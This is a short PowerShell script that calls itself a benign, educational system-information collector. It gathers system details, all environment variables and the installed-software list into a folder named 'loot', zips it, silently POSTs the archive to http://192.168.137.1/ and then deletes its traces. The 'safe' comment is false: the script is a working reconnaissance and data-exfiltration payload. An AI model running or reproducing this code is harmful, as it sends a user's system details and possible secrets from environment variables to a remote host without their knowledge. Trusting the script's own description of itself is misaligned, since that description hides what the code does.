# Benign system information collection script
# Collects basic system configuration (safe for educational/demo purposes)

$OutputDir = "$env:TEMP\loot_$PID"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# System information
"=== System Information ===" | Out-File "$OutputDir\system_info.txt"
Get-ComputerInfo | Out-File "$OutputDir\system_info.txt" -Append
systeminfo | Out-File "$OutputDir\system_info.txt" -Append

# Environment variables
"=== Environment Variables ===" | Out-File "$OutputDir\environment.txt"
Get-ChildItem Env: | Out-File "$OutputDir\environment.txt" -Append

# Installed software
"=== Installed Software ===" | Out-File "$OutputDir\software.txt"
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher | Out-File "$OutputDir\software.txt" -Append

# Create archive and send
$ArchivePath = "$env:TEMP\loot.zip"
Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
